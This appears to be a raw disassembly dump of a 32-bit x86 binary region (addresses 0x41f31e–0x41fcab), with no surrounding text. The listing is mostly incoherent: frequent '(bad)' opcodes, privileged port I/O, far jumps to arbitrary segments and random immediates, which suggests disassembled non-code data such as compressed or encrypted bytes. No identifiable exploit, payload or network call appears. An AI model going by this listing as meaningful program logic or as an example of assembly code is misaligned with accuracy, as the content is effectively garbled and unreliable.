  41f31e:	and    edx,DWORD PTR ss:[ebx+0x1d]
  41f322:	loop   0x41f355
  41f324:	data16 je 0x41f30d
  41f327:	jl     0x41f324
  41f329:	inc    edx
  41f32a:	cmp    eax,0xe7554728
  41f32f:	cmp    BYTE PTR [ebp+ebx*4+0x8],al
  41f333:	bound  ebp,QWORD PTR [ebx]
  41f335:	dec    ecx
  41f336:	in     eax,dx
  41f337:	inc    edi
  41f338:	or     DWORD PTR [edi-0x6a],eax
  41f33b:	xchg   esp,eax
  41f33c:	mov    esp,0xf2aa29a5
  41f341:	scas   al,BYTE PTR es:[edi]
  41f342:	push   esi
  41f343:	loopne 0x41f2c7
  41f345:	push   eax
  41f346:	into   
  41f347:	sub    bh,BYTE PTR [ebp+0x3e]
  41f34a:	sbb    ecx,eax
  41f34c:	xor    eax,0x7fcec5fe
  41f351:	xchg   ecx,eax
  41f352:	and    al,0x77
  41f354:	pop    edi
  41f355:	push   cs
  41f356:	ds jnp 0x41f395
  41f359:	inc    esp
  41f35a:	fistp  DWORD PTR [ecx+0x57]
  41f35d:	xlat   BYTE PTR ds:[ebx]
  41f35e:	pop    ss
  41f35f:	and    BYTE PTR [ecx-0x2c],bl
  41f362:	out    dx,al
  41f363:	cmp    BYTE PTR [ebp+eiz*8+0x13],0x57
  41f368:	aam    0xb
  41f36a:	sub    eax,DWORD PTR [eax+0x1a]
  41f36d:	pop    ecx
  41f36e:	int    0x31
  41f370:	cmp    DWORD PTR [esi-0x34f22ddf],esi
  41f376:	cwde   
  41f377:	gs iret 
  41f379:	jne    0x41f31d
  41f37b:	dec    edi
  41f37c:	or     DWORD PTR [ebx],esi
  41f37e:	int    0xb9
  41f380:	sar    BYTE PTR [eax+0x1bd708f],cl
  41f386:	fstp   DWORD PTR [ecx]
  41f388:	(bad)  
  41f389:	out    0xcd,eax
  41f38b:	mov    eax,0x923638a5
  41f390:	or     al,0xd7
  41f392:	adc    edi,esp
  41f394:	neg    BYTE PTR [edx]
  41f396:	int3   
  41f397:	daa    
  41f398:	pop    ecx
  41f399:	sbb    BYTE PTR [edx],0x7
  41f39c:	mov    ds:0x2e3054ee,al
  41f3a1:	sub    al,0xba
  41f3a3:	dec    esi
  41f3a4:	scas   al,BYTE PTR es:[edi]
  41f3a5:	sbb    DWORD PTR [ecx],edi
  41f3a7:	add    ebp,DWORD PTR [edi-0x50]
  41f3aa:	and    al,cl
  41f3ac:	mov    ebp,DWORD PTR [esi]
  41f3ae:	adc    DWORD PTR [ecx+0x72],0x30
  41f3b2:	jmp    0x41f354
  41f3b4:	add    al,0xf9
  41f3b6:	aam    0xd8
  41f3b8:	mov    bh,0x63
  41f3ba:	dec    ecx
  41f3bc:	sbb    eax,0x1534c123
  41f3c1:	popa   
  41f3c2:	sub    esi,DWORD PTR [eax-0x13]
  41f3c5:	sub    BYTE PTR [eax+0x8345de2],cl
  41f3cb:	adc    al,0x6c
  41f3cd:	push   ebx
  41f3ce:	dec    ecx
  41f3cf:	hlt    
  41f3d0:	(bad)  
  41f3d1:	and    al,0x9e
  41f3d3:	jne    0x41f383
  41f3d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3d6:	xor    dl,al
  41f3d8:	mov    ds:0xf7ce5cc7,al
  41f3dd:	sub    DWORD PTR [eax+0x4a],esp
  41f3e0:	aam    0xa8
  41f3e2:	fscale 
  41f3e4:	test   BYTE PTR [si+0x6e9],al
  41f3e9:	mov    DWORD PTR [edx+edi*2],0xcc4ff452
  41f3f0:	call   0xb389e8ba
  41f3f5:	xchg   ch,ah
  41f3f7:	out    0x30,eax
  41f3f9:	in     al,dx
  41f3fa:	mov    ecx,0xf2482c71
  41f3ff:	and    edi,DWORD PTR [esi]
  41f401:	push   esp
  41f402:	mov    dl,0xa1
  41f404:	(bad)  
  41f405:	out    0xc4,eax
  41f407:	daa    
  41f408:	std    
  41f409:	je     0x41f413
  41f40b:	mov    ah,0x70
  41f40d:	adc    ebx,esi
  41f40f:	fadd   DWORD PTR [eax]
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xd4
  41f481:	add    DWORD PTR [ecx+0x14cc04f],edx
  41f487:	add    BYTE PTR [ecx+eax*1],al
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	adc    eax,0xe51afcca
  41f491:	lahf   
  41f492:	mov    cs,esp
  41f494:	scas   eax,DWORD PTR es:[edi]
  41f495:	(bad)  
  41f496:	dec    esi
  41f497:	sbb    eax,0x89b2dc8d
  41f49c:	xchg   esi,eax
  41f49d:	push   ebx
  41f49e:	mov    ch,0xa7
  41f4a0:	cwde   
  41f4a1:	xor    al,BYTE PTR [ecx-0x33920c93]
  41f4a7:	adc    esi,DWORD PTR [ebp+edi*4+0x20]
  41f4ab:	and    cl,BYTE PTR [edx+ecx*2-0x11]
  41f4af:	jne    0x41f513
  41f4b1:	cdq    
  41f4b2:	pop    eax
  41f4b3:	jb     0x41f449
  41f4b5:	call   DWORD PTR [esi-0x4923c64f]
  41f4bb:	data16 xor al,0x37
  41f4be:	in     eax,0xde
  41f4c0:	lods   eax,DWORD PTR ds:[esi]
  41f4c1:	push   dx
  41f4c3:	add    DWORD PTR [ebx],esi
  41f4c5:	xchg   ebx,eax
  41f4c6:	ret    
  41f4c7:	pop    esi
  41f4c8:	ins    BYTE PTR es:[edi],dx
  41f4c9:	pop    ecx
  41f4ca:	iret   
  41f4cb:	push   es
  41f4cc:	push   ebp
  41f4cd:	arpl   WORD PTR [ecx-0xefe9d49],bp
  41f4d3:	mov    al,ds:0x79c3f09b
  41f4d8:	inc    esi
  41f4d9:	jecxz  0x41f557
  41f4db:	and    DWORD PTR [ebx+0x54fe8314],esp
  41f4e1:	adc    eax,0xf00e7fb
  41f4e6:	aam    0xff
  41f4e8:	and    eax,0x9d61429b
  41f4ed:	adc    bh,al
  41f4ef:	xchg   esi,eax
  41f4f0:	je     0x41f4a1
  41f4f2:	mov    ds:0x4cf9b72d,eax
  41f4f7:	mov    bh,0x24
  41f4f9:	mov    ebx,es
  41f4fb:	outs   dx,DWORD PTR ds:[esi]
  41f4fc:	or     BYTE PTR gs:[esi-0x60d9e6d],cl
  41f503:	or     al,0xb9
  41f505:	mov    ebx,DWORD PTR [ebx]
  41f507:	out    0x8b,eax
  41f509:	sti    
  41f50a:	pop    edi
  41f50b:	and    DWORD PTR [edi],eax
  41f50d:	(bad)  
  41f50e:	popa   
  41f50f:	addr16 pop es
  41f511:	or     BYTE PTR [edx-0x61afbd62],cl
  41f517:	add    BYTE PTR [ecx-0x15],ah
  41f51a:	scas   al,BYTE PTR es:[edi]
  41f51b:	pushf  
  41f51c:	test   eax,edx
  41f51e:	mov    esp,0xf8fe4811
  41f523:	push   ss
  41f524:	stc    
  41f525:	or     dh,BYTE PTR [eax-0x51]
  41f528:	ret    0xccf1
  41f52b:	nop
  41f52c:	mov    al,ds:0xecdd0c7b
  41f531:	fs leave 
  41f533:	pop    ebp
  41f534:	repz mov ebx,gs
  41f537:	inc    eax
  41f538:	icebp  
  41f539:	scas   al,BYTE PTR es:[edi]
  41f53a:	xor    al,0x43
  41f53c:	mov    al,ds:0x37c750d7
  41f541:	das    
  41f542:	mov    esp,0x490ed560
  41f547:	sub    BYTE PTR [ecx+edi*8-0x1d029b86],bh
  41f54e:	sub    BYTE PTR [eax+edi*4-0xb],dh
  41f552:	sub    al,0x2e
  41f554:	mov    bh,0x4c
  41f556:	out    0xc8,eax
  41f558:	xor    ebx,DWORD PTR [ecx+0xf89d9ea]
  41f55e:	bound  edx,QWORD PTR [ecx]
  41f560:	mov    ?,WORD PTR [edi]
  41f562:	test   DWORD PTR [edx],edi
  41f564:	test   BYTE PTR [ebx+0x45],bh
  41f567:	jmp    0x61c4:0x98946f90
  41f56e:	mov    bl,0xd7
  41f570:	and    BYTE PTR [edi-0x5],bh
  41f573:	ja     0x41f4f9
  41f575:	js     0x41f509
  41f577:	sub    bl,dl
  41f579:	jg     0x41f561
  41f57b:	inc    esp
  41f57c:	or     cl,BYTE PTR [edi-0x8]
  41f57f:	dec    edx
  41f580:	mov    ds:0x966abd9,eax
  41f585:	and    dl,al
  41f587:	pop    es
  41f588:	in     al,dx
  41f589:	js     0x41f5d7
  41f58b:	cwde   
  41f58c:	ins    BYTE PTR es:[edi],dx
  41f58d:	test   eax,0xaaa5
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x742b:0xc5b2d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	dec    eax
  41f60d:	aas    
  41f60e:	aaa    
  41f60f:	jne    0x41f64c
  41f611:	mov    dh,0xa7
  41f613:	or     bh,BYTE PTR [ecx+esi*1-0x66d5b9c5]
  41f61a:	scas   eax,DWORD PTR es:[edi]
  41f61b:	and    DWORD PTR [esi-0x43f962b4],ebx
  41f621:	sub    bl,bh
  41f623:	lock add dl,al
  41f626:	xchg   ebp,eax
  41f627:	jbe    0x41f67e
  41f629:	jg     0x41f5c4
  41f62b:	sub    al,0xc4
  41f62d:	bound  edi,QWORD PTR [eax+0x12]
  41f630:	pop    esi
  41f631:	test   al,0x94
  41f633:	jp     0x41f5c8
  41f635:	sbb    BYTE PTR [esi*2+0x177b3e5d],ch
  41f63c:	int3   
  41f63d:	popa   
  41f63e:	push   esp
  41f63f:	or     ebx,eax
  41f641:	cmp    BYTE PTR [eax-0x75],0x4d
  41f645:	(bad)  
  41f646:	cmp    esp,edx
  41f648:	push   cs
  41f649:	out    dx,al
  41f64a:	sbb    eax,0x62f38eeb
  41f64f:	push   eax
  41f650:	(bad)  
  41f651:	cs loopne 0x41f5d6
  41f654:	pop    edi
  41f655:	and    BYTE PTR [edx+ebp*1+0x6db8be08],0xc1
  41f65d:	pop    ss
  41f65e:	ffree  st(5)
  41f660:	sub    BYTE PTR [esp+ecx*8-0x56effc3e],bh
  41f667:	cmp    BYTE PTR [esi+edi*4+0x26cf07c4],bh
  41f66e:	xor    bl,ch
  41f670:	mov    bh,0x76
  41f672:	fs scas al,BYTE PTR es:[edi]
  41f674:	inc    ebx
  41f675:	push   0xf8672073
  41f67a:	jmp    0x2e36b737
  41f67f:	xchg   edi,eax
  41f680:	fiadd  DWORD PTR [edx+0x5b]
  41f683:	ins    BYTE PTR es:[edi],dx
  41f684:	mov    ds:0x634c6745,eax
  41f689:	mov    eax,0x20b81aa0
  41f68e:	scas   eax,DWORD PTR es:[edi]
  41f68f:	sbb    dl,BYTE PTR [edx+0x2695fcc3]
  41f695:	aas    
  41f696:	push   ebx
  41f697:	dec    esp
  41f698:	sub    BYTE PTR [eax+0x6fbaa10e],cl
  41f69e:	daa    
  41f69f:	adc    al,0x9
  41f6a1:	add    eax,0x158045b
  41f6a6:	adc    esp,DWORD PTR [esi-0x408b8c48]
  41f6ac:	in     eax,dx
  41f6ad:	jnp    0x41f679
  41f6af:	stos   DWORD PTR es:[edi],eax
  41f6b0:	ins    DWORD PTR es:[edi],dx
  41f6b1:	loope  0x41f6d4
  41f6b3:	dec    edi
  41f6b4:	pop    es
  41f6b5:	aam    0xf4
  41f6b7:	popa   
  41f6b8:	ret    0xedad
  41f6bb:	pop    ebp
  41f6bc:	icebp  
  41f6bd:	int    0xc
  41f6bf:	inc    eax
  41f6c0:	out    0xc4,al
  41f6c2:	iret   
  41f6c3:	mov    eax,ds:0x32da1147
  41f6c8:	pusha  
  41f6c9:	clc    
  41f6ca:	sbb    BYTE PTR [eax+0x6f],ch
  41f6cd:	push   0x2
  41f6cf:	add    BYTE PTR [ebp+0x270c4d8e],dl
  41f6d5:	xlat   BYTE PTR ds:[ebx]
  41f6d6:	sbb    BYTE PTR [eax+0x3f],dl
  41f6d9:	outs   dx,BYTE PTR ds:[esi]
  41f6da:	pop    edx
  41f6db:	push   ecx
  41f6dc:	dec    eax
  41f6dd:	push   edx
  41f6de:	add    eax,0x98ff563a
  41f6e3:	mov    esp,0x168a3d17
  41f6e8:	jbe    0x41f704
  41f6ea:	ret    0xc3d8
  41f6ed:	js     0x41f766
  41f6ef:	test   DWORD PTR [ebp-0x75af9d2a],ecx
  41f6f5:	retf   0x5b1b
  41f6f8:	hlt    
  41f6f9:	out    0xd,al
  41f6fb:	not    BYTE PTR [edi]
  41f6fd:	(bad)  
  41f6ff:	or     DWORD PTR [ebp-0x79],0x63
  41f703:	mov    bh,bh
  41f705:	(bad)  
  41f706:	jecxz  0x41f72a
  41f708:	inc    ecx
  41f709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f70a:	test   DWORD PTR [eax],ebx
  41f70c:	adc    al,BYTE PTR [ebp+0x85f9]
	...
  41f772:	add    BYTE PTR [eax],al
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xe6b0:0xd56c62d2
  41f783:	sbb    eax,ecx
  41f785:	dec    esi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	enter  0x1be7,0x4
  41f790:	push   ebx
  41f792:	xchg   ebx,eax
  41f793:	call   0xee4d3b5
  41f798:	mov    ecx,DWORD PTR [ecx-0x63ab9f5b]
  41f79e:	(bad)  
  41f79f:	add    eax,ecx
  41f7a1:	xchg   esp,eax
  41f7a2:	jmp    0x80b2:0x4ecc048f
  41f7a9:	stos   BYTE PTR es:[edi],al
  41f7aa:	xchg   esi,eax
  41f7ab:	jno    0x41f747
  41f7ad:	xor    al,0xca
  41f7af:	fstp   DWORD PTR [edx]
  41f7b1:	call   0x5ea3bd88
  41f7b6:	ins    DWORD PTR es:[edi],dx
  41f7b7:	test   BYTE PTR ds:0x4bd3493d,ch
  41f7bd:	imul   edi,edx,0x30
  41f7c0:	je     0x41f7cc
  41f7c2:	dec    esp
  41f7c3:	lahf   
  41f7c4:	sub    DWORD PTR [ebx+0x41],eax
  41f7c7:	adc    dl,BYTE PTR [eax]
  41f7c9:	jge    0x41f7c9
  41f7cb:	nop    esi
  41f7ce:	jns    0x41f7c0
  41f7d0:	fldenv [edi]
  41f7d2:	mov    dh,0xa3
  41f7d4:	fs and eax,0xa68cefe2
  41f7da:	push   ebx
  41f7db:	cmp    DWORD PTR [ebp+0x152348e1],esi
  41f7e1:	and    esi,DWORD PTR [edi+0x6b34d99d]
  41f7e7:	stc    
  41f7e8:	adc    DWORD PTR [edi],ecx
  41f7ea:	int3   
  41f7eb:	sub    BYTE PTR [edi-0x339c0fe6],ah
  41f7f1:	jne    0x41f848
  41f7f3:	lea    esp,[esp+eiz*2-0x5d]
  41f7f7:	mov    al,ds:0x48a0903b
  41f7fc:	loope  0x41f7b9
  41f7fe:	jmp    0x8d6975b2
  41f803:	arpl   WORD PTR [esi-0x4ec25c1c],dx
  41f809:	das    
  41f80a:	push   esp
  41f80b:	jmp    0xcb920be8
  41f810:	test   DWORD PTR [ebx+eax*2-0x2a],ecx
  41f814:	jo     0x41f853
  41f816:	push   ebx
  41f817:	push   ds
  41f818:	sbb    ebx,eax
  41f81a:	add    DWORD PTR [ebx-0x1],eax
  41f81d:	(bad)  
  41f81e:	pop    edx
  41f81f:	mov    ebx,esi
  41f821:	xchg   esp,eax
  41f822:	leave  
  41f823:	dec    edx
  41f824:	or     eax,0xc054e103
  41f829:	loop   0x41f8a0
  41f82b:	xor    al,bh
  41f82d:	mov    esi,0x33a893b6
  41f832:	push   ecx
  41f833:	mov    dl,0x6d
  41f835:	pop    esp
  41f836:	repz cld 
  41f838:	shr    DWORD PTR [esi-0x59a8fb81],0x61
  41f83f:	or     dl,0x91
  41f842:	adc    al,BYTE PTR [edx-0x78a55c70]
  41f848:	or     dl,dh
  41f84a:	test   eax,0x8072bb51
  41f84f:	mov    ecx,eax
  41f851:	es call 0x90f3b23c
  41f857:	jmp    0xf830:0xde63463a
  41f85e:	jo     0x41f838
  41f860:	sbb    bl,al
  41f862:	jo     0x41f859
  41f864:	pop    edx
  41f865:	jecxz  0x41f888
  41f867:	fcmovbe st,st(7)
  41f869:	inc    ebx
  41f86a:	jnp    0x41f8d5
  41f86c:	jae    0x41f7f5
  41f86e:	jl     0x41f851
  41f870:	gs es jae 0x41f809
  41f874:	add    DWORD PTR [eax+eiz*2-0x5aec1bc3],ebp
  41f87b:	aas    
  41f87c:	outs   dx,BYTE PTR ds:[esi]
  41f87d:	adc    DWORD PTR [esi+esi*8-0x36faa614],edi
  41f884:	xor    al,0x29
  41f886:	sbb    ebp,DWORD PTR [ecx]
  41f888:	jne    0x41f817
  41f88a:	imul   ch
  41f88c:	xor    al,0x30
  41f88e:	fnstcw WORD PTR [esi+0x0]
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	fbld   TBYTE PTR [esp-0x2b]
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	jge    0x6ad7e315
  41f912:	xchg   ecx,eax
  41f913:	sbb    al,0x50
  41f915:	sar    DWORD PTR [ebx-0xb],1
  41f918:	leave  
  41f919:	jmp    0x41f979
  41f91b:	leave  
  41f91c:	xchg   ecx,eax
  41f91d:	dec    edi
  41f91e:	dec    edi
  41f91f:	push   esi
  41f920:	sbb    ebp,esp
  41f922:	sti    
  41f923:	int    0x16
  41f925:	retf   0x4e82
  41f928:	mov    ds:0xdc19ac4f,al
  41f92d:	fistp  QWORD PTR [edi]
  41f92f:	jge    0x41f906
  41f931:	push   edi
  41f932:	pop    edx
  41f933:	jno    0x41f965
  41f935:	daa    
  41f936:	pop    es
  41f937:	lods   eax,DWORD PTR ds:[esi]
  41f938:	les    eax,FWORD PTR [ebp+0xb427847]
  41f93e:	outs   dx,DWORD PTR ds:[esi]
  41f93f:	jmp    0x22e4:0x70375088
  41f946:	aad    0x9
  41f948:	scas   al,BYTE PTR es:[edi]
  41f949:	push   es
  41f94a:	cmp    al,0xff
  41f94c:	fwait
  41f94d:	inc    edi
  41f94e:	cdq    
  41f94f:	fdivr  QWORD PTR [edx+0x70d41264]
  41f955:	in     eax,0xc
  41f957:	push   edi
  41f958:	sbb    BYTE PTR ds:0xff7e5e98,cl
  41f95e:	xchg   ebp,eax
  41f95f:	cld    
  41f960:	cmc    
  41f961:	sbb    DWORD PTR [ebx],esi
  41f963:	mov    ah,0xb0
  41f965:	and    ah,BYTE PTR [eax]
  41f967:	xor    DWORD PTR [edx+esi*4+0x6],ebx
  41f96b:	dec    esi
  41f96c:	pop    ss
  41f96d:	push   ss
  41f96e:	xchg   esi,eax
  41f96f:	test   bh,ch
  41f971:	add    bh,ah
  41f973:	call   0x45f9eddb
  41f978:	push   es
  41f979:	xor    eax,0x8a1d649f
  41f97e:	pop    ss
  41f97f:	pop    es
  41f980:	dec    edi
  41f981:	cs into 
  41f983:	push   esi
  41f984:	cs aad 0x76
  41f987:	es ins DWORD PTR es:[edi],dx
  41f989:	or     BYTE PTR [eax+0x7540ea24],ch
  41f98f:	mov    dh,0x4d
  41f991:	dec    ebp
  41f992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f993:	scas   al,BYTE PTR es:[edi]
  41f994:	or     DWORD PTR [edi+edi*2],esp
  41f997:	dec    ecx
  41f998:	ret    0x468d
  41f99b:	mov    ecx,0x914295d4
  41f9a0:	dec    edi
  41f9a1:	clc    
  41f9a2:	clc    
  41f9a3:	int    0xa8
  41f9a5:	jno    0x41fa23
  41f9a7:	mov    ch,0x7e
  41f9a9:	aaa    
  41f9aa:	fcmovnb st,st(5)
  41f9ac:	in     al,0xa9
  41f9ae:	fistp  DWORD PTR [edx]
  41f9b0:	dec    edx
  41f9b1:	add    edx,DWORD PTR [ebx-0x6a]
  41f9b4:	dec    esi
  41f9b5:	mov    ah,0x23
  41f9b7:	aas    
  41f9b8:	jo     0x41f977
  41f9ba:	cmp    al,0x93
  41f9bc:	mov    esp,0xe6b8932d
  41f9c1:	xchg   ebp,eax
  41f9c2:	dec    ebp
  41f9c3:	pusha  
  41f9c4:	jns    0x41f975
  41f9c6:	retf   0xe235
  41f9c9:	add    eax,0x3af8f8fb
  41f9ce:	ret    0xad9c
  41f9d1:	shl    BYTE PTR [edx+0x4c302844],0xe6
  41f9d8:	push   cs
  41f9d9:	and    BYTE PTR [eax],ch
  41f9db:	out    dx,al
  41f9dc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f9de:	call   0xd37a:0x5a0bc7be
  41f9e5:	clc    
  41f9e6:	inc    eax
  41f9e7:	sub    al,0xa4
  41f9e9:	ss mov edx,0x37479327
  41f9ef:	fmul   QWORD PTR ds:0x8c2e1c30
  41f9f5:	nop
  41f9f6:	add    DWORD PTR [ecx+0x262b20cf],esi
  41f9fc:	sub    eax,DWORD PTR [esi]
  41f9fe:	or     ah,BYTE PTR [edi-0x10]
  41fa01:	or     DWORD PTR [edx],esp
  41fa03:	repz mov di,dx
  41fa07:	xchg   dh,ch
  41fa09:	sub    esp,esp
  41fa0b:	in     eax,dx
  41fa0c:	sbb    ebp,DWORD PTR [ebp+0x69]
  41fa0f:	jne    0x41fa11
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0xc7ae0e15,eax
  41fa83:	(bad)  
  41fa85:	push   eax
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    al,0x1
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	mov    ah,0x49
  41fa8e:	(bad)  
  41fa8f:	dec    esi
  41fa90:	ins    BYTE PTR es:[edi],dx
  41fa91:	ret    
  41fa92:	xchg   edx,eax
  41fa93:	mov    esi,0x7d19496
  41fa98:	fwait
  41fa99:	loopne 0x41fa41
  41fa9b:	add    ecx,DWORD PTR [eax]
  41fa9d:	lods   al,BYTE PTR ds:[esi]
  41fa9e:	(bad)  
  41faa0:	(bad)  
  41faa1:	int    0x1b
  41faa3:	jne    0x41fa47
  41faa5:	mov    ch,BYTE PTR [eax-0x4f8299c8]
  41faab:	xchg   ebx,eax
  41faac:	daa    
  41faad:	es pop ds
  41faaf:	pop    edx
  41fab0:	pop    esi
  41fab1:	cmp    al,0xe5
  41fab3:	mov    eax,0x824afff0
  41fab8:	inc    edi
  41fab9:	ja     0x41fb2b
  41fabb:	sti    
  41fabc:	cwde   
  41fabd:	sub    dh,BYTE PTR [edi+eiz*4+0x6ee09235]
  41fac4:	jbe    0x41fa76
  41fac6:	shr    BYTE PTR [esi+0x2986123],0xe4
  41facd:	stos   BYTE PTR es:[edi],al
  41face:	nop
  41facf:	rcr    eax,cl
  41fad1:	fcomp  QWORD PTR [ebx+0x43d4164]
  41fad7:	sbb    esi,DWORD PTR [edx+eax*4]
  41fada:	add    al,BYTE PTR [ebp-0x4bdc27a2]
  41fae0:	sub    cl,BYTE PTR [edx+ebp*4-0x54d44128]
  41fae7:	jnp    0x41fb1d
  41fae9:	jmp    0x52cf:0x84a0ea02
  41faf0:	xor    esp,edx
  41faf2:	mov    esi,0x3bae0edc
  41faf7:	mov    ch,ch
  41faf9:	ficom  DWORD PTR [eax+0x5]
  41fafc:	mov    ds:0x43ac3b5f,al
  41fb01:	mov    ebp,0xa825c747
  41fb06:	dec    edx
  41fb07:	in     al,0x19
  41fb09:	jp     0x41fad5
  41fb0b:	stos   BYTE PTR es:[edi],al
  41fb0c:	inc    eax
  41fb0d:	enter  0x80b9,0xfd
  41fb11:	inc    esp
  41fb12:	jg     0x41fb58
  41fb14:	pop    ebx
  41fb15:	int3   
  41fb16:	push   esi
  41fb17:	sub    edi,DWORD PTR [eax+0x5ac600bd]
  41fb1d:	dec    ebx
  41fb1e:	cmp    al,0xc1
  41fb20:	push   es
  41fb21:	rol    DWORD PTR [ebx],0xb9
  41fb24:	pop    ebp
  41fb25:	mov    edx,0xf5d8c
  41fb2a:	imul   ebp,DWORD PTR [edx+0x534c823e],0xffffffb3
  41fb31:	mov    ds:0x6b03900b,al
  41fb36:	ja     0x41faec
  41fb38:	(bad)  
  41fb39:	ins    DWORD PTR es:[edi],dx
  41fb3a:	xor    al,0x7b
  41fb3c:	pushf  
  41fb3d:	jg     0x41fb8a
  41fb3f:	dec    eax
  41fb40:	in     al,0x85
  41fb42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb43:	inc    esp
  41fb44:	popa   
  41fb45:	or     bh,BYTE PTR [ebp-0x6355dfea]
  41fb4b:	xlat   BYTE PTR ds:[ebx]
  41fb4c:	jmp    FWORD PTR [ebx-0x6b]
  41fb4f:	das    
  41fb50:	dec    esp
  41fb51:	mov    bh,0x17
  41fb53:	mov    DWORD PTR [ebp-0x34d8a241],edx
  41fb59:	sub    al,0x29
  41fb5b:	mov    ecx,0xda35c401
  41fb60:	pop    esi
  41fb61:	das    
  41fb62:	enter  0x2274,0x8f
  41fb66:	mov    esi,esp
  41fb68:	sub    al,0xbd
  41fb6a:	and    ch,BYTE PTR [ebx+0x5f81601b]
  41fb70:	pop    ds
  41fb71:	adc    esi,ebx
  41fb73:	out    dx,al
  41fb74:	pop    ss
  41fb75:	in     eax,dx
  41fb76:	and    esi,0xbef0fe97
  41fb7c:	inc    edi
  41fb7d:	outs   dx,DWORD PTR ds:[esi]
  41fb7e:	jns    0x41fbd3
  41fb80:	ins    DWORD PTR es:[edi],dx
  41fb81:	shl    BYTE PTR [ebp+0x6],cl
  41fb84:	pop    edi
  41fb85:	xor    eax,0x4e58c7df
  41fb8a:	mov    edx,ds
  41fb8c:	(bad)  
  41fb8d:	xor    edi,DWORD PTR [esp+edi*8+0x0]
	...
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	lods   al,BYTE PTR ds:[esi]
  41fc01:	xor    BYTE PTR [ebp+esi*4+0x151d4],dh
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	push   ebp
  41fc0d:	fwait
  41fc0e:	rcl    edx,1
  41fc10:	dec    esp
  41fc11:	add    ch,ah
  41fc13:	cmc    
  41fc14:	push   cs
  41fc15:	jle    0x41fbbb
  41fc17:	scas   al,BYTE PTR es:[edi]
  41fc18:	inc    edx
  41fc19:	call   0x9473fa74
  41fc1e:	scas   eax,DWORD PTR es:[edi]
  41fc1f:	or     BYTE PTR [edi],ah
  41fc21:	out    dx,al
  41fc22:	xchg   ebp,eax
  41fc23:	scas   eax,DWORD PTR es:[edi]
  41fc24:	ja     0x41fc9f
  41fc26:	ret    
  41fc27:	xor    al,0x10
  41fc29:	mov    gs,WORD PTR [ecx-0x12]
  41fc2c:	shr    al,1
  41fc2e:	repz add eax,0x785a7dcc
  41fc34:	jo     0x41fc4d
  41fc36:	iret   
  41fc37:	fwait
  41fc38:	push   esp
  41fc39:	sahf   
  41fc3a:	out    0x36,al
  41fc3c:	stc    
  41fc3d:	xor    ah,BYTE PTR [ebp+ebp*2+0x654d8883]
  41fc44:	fistp  DWORD PTR [eax+edi*1+0x31]
  41fc48:	popf   
  41fc49:	jb     0x41fc2b
  41fc4b:	mov    al,ds:0xeec983cb
  41fc50:	neg    BYTE PTR [eax+esi*1]
  41fc53:	mov    cl,0x86
  41fc55:	fcomp  DWORD PTR [esp+ebx*8+0x6bd440df]
  41fc5c:	pop    ds
  41fc5d:	shl    DWORD PTR [ebx],0xc6
  41fc60:	into   
  41fc61:	jo     0x41fbfa
  41fc63:	xchg   esi,eax
  41fc64:	std    
  41fc65:	inc    esi
  41fc66:	mov    dh,0x88
  41fc68:	loope  0x41fcce
  41fc6a:	mov    cs,edi
  41fc6c:	and    edi,eax
  41fc6e:	add    dl,al
  41fc70:	pop    esi
  41fc71:	loope  0x41fc2e
  41fc73:	jg     0x41fbfe
  41fc75:	xchg   edi,eax
  41fc76:	ss retf 0x18db
  41fc7a:	jae    0x41fca9
  41fc7c:	ins    DWORD PTR es:[edi],dx
  41fc7d:	mov    dl,0x7e
  41fc7f:	or     bl,cl
  41fc81:	pop    es
  41fc82:	pop    ecx
  41fc83:	cmp    ebx,DWORD PTR [ecx+ebx*2+0x39cf10da]
  41fc8a:	loop   0x41fce3
  41fc8c:	cmp    edx,edx
  41fc8e:	and    eax,0x45501c39
  41fc93:	test   BYTE PTR [ebx+eax*4],dh
  41fc96:	xor    al,0x56
  41fc98:	daa    
  41fc99:	xchg   ch,ah
  41fc9b:	sbb    al,0xd4
  41fc9d:	inc    esp
  41fc9e:	xchg   ecx,eax
  41fc9f:	outs   dx,DWORD PTR ds:[esi]
  41fca0:	dec    ebp
  41fca1:	and    dl,al
  41fca3:	test   esp,ecx
  41fca5:	retf   
  41fca6:	test   eax,0x48e93d11
  41fcab:	lock dec esi
